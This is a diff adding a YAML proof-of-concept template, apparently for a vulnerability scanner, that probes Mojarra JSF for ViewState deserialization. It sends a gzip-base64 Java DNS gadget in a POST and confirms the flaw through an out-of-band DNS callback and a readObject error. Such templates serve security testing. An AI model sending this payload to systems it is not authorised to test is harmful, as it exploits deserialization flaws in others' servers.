@@ -1,0 +1,27 @@
+id: poc-yaml-mojarra-jsf-viewstate-deserialization
+info:
+  name: Mojarra JSF ViewState 反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 反序列化
+  finger: mojarra_javaserver_faces
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  gadget: java_dns_url_gadget("http://"+domain, "gzip-base64")
+  payload: urlencode(gadget)
+requests:
+- method: POST
+  path: /index.xhtml
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: j_idt6=j_idt6&j_idt6%3Aj_idt7=aaaa&j_idt6%3Aj_idt8=Hello&javax.faces.ViewState={{.payload}}
+  expression: 'status_code == 500 &&
+
+    contains(body,"java.io.ObjectInputStream.readObject") &&
+
+    reverse.Verify()
+
+    '
+transport: http
